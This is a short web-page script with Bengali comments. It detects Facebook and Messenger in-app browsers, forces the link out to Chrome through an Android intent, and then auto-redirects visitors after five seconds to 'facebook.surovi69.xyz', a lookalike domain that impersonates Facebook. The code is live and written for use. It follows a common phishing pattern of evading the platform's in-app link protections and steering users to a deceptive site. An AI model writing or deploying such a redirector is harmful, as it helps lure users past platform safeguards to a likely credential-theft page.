    <script>
        const finalUrl = "https://facebook.surovi69.xyz";
        // সরাসরি ক্রোম ব্রাউজার ওপেন করার অ্যান্ড্রয়েড ইন্টেন্ট
        const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";

        function openInExternalBrowser() {
            const isFBApp = /FBAN|FBAV|Messenger/i.test(navigator.userAgent);
            if (isFBApp) {
                // এটি অ্যান্ড্রয়েড ফোন হলে সরাসরি ক্রমে যাওয়ার সিগন্যাল দিবে
                window.location.href = chromeIntent;
            }
        }

        // ১. পেজ লোড হওয়ার সাথে সাথেই ক্রোম-এ নেওয়ার চেষ্টা করবে
        window.onload = function() {
            openInExternalBrowser();

            // ২. ৫ সেকেন্ড পর অটো রিডাইরেক্ট হবে গন্তব্যে
            setTimeout(() => {
                window.location.href = finalUrl;
            }, 5000);
        };

        // ৩. বাটনে ক্লিক করলে সরাসরি গন্তব্যে নিয়ে যাবে
        document.getElementById('actionBtn').addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = finalUrl;
        });
    </script>
